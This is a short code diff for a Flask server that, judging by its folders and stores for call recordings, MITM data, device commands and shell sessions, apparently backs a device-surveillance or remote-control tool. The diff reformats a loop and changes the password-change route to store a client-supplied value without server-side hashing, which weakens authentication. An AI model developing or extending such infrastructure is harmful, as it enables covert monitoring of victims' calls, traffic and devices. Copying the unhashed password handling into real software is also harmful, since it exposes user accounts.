@@ -10,7 +10,8 @@ UPLOADS = os.path.join(BASE_DIR, 'uploads')
 DOWNLOADS = os.path.join(BASE_DIR, 'downloads')
 CALLS = os.path.join(BASE_DIR, 'call_recordings')
 MITM = os.path.join(BASE_DIR, 'mitm_data')
-for folder in [UPLOADS, DOWNLOADS, CALLS, MITM]: os.makedirs(folder, exist_ok=True)
+for folder in [UPLOADS, DOWNLOADS, CALLS, MITM]:
+    os.makedirs(folder, exist_ok=True)
 
 # === In-Memory Data Stores ===
 devices = {}
@@ -23,6 +24,8 @@ commands, results, shell_sessions = {}, {}, {}
 def hash_password(p): return hashlib.sha256(p.encode()).hexdigest()
 def now(): return datetime.datetime.utcnow().isoformat()
 def allowed(f): return '.' in f and f.rsplit('.', 1)[1].lower() in {'jpg','png','mp4','mp3','txt','zip','wav','json','apk'}
+
+# === Auth ===
 @app.route('/login', methods=['POST'])
 def login():
     d = request.json
@@ -177,9 +180,9 @@ def admin_devices(user_token):
 @app.route('/change_password', methods=['POST'])
 def change_password():
     d = request.json
-    token, new_pass = d['user_token'], d['new_password']
+    token, new_hashed_pass = d['user_token'], d['new_password']
     if token in users:
-        users[token]['password'] = hash_password(new_pass)
+        users[token]['password'] = new_hashed_pass  # Client already hashes
         return jsonify(status='updated')
     return jsonify(status='not_found'), 404
 
